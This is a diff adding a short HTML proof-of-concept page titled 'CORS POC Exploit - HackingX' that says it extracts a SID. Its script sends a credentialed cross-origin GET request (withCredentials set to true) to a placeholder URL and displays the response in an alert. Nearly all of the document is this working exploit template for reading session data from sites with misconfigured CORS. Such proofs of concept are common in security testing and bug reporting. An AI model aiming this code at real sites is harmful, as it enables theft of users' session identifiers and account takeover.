@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+    <body>
+        <center>
+            <h2>CORS POC Exploit - HackingX</h2>
+            <h3>Extract SID</h3>
+            <h3>by Franciny Salles (#Bl4kd43m0n)</h3>
+            
+            <div id="mypoc">
+                <button type="button" onclick="cors()">Exploit</button>
+            </div>
+            
+            <script>
+                function cors(){
+                    var xhttp = new XMLHttpRequest();
+                    
+                    xhttp.onreadystatechange = 
+                        function(){
+                        if (this.readyState ==4 && this.status == 200){
+                            document.getElementById("mypoc").innerHTML = alert(this.responseText);
+                        }
+                    };
+                    xhttp.open("GET", "url", true);
+                    xhttp.withCredentials = true;
+                    xhttp.send();
+                }
+            </script>
+        </center>
+    </body>
+</html>
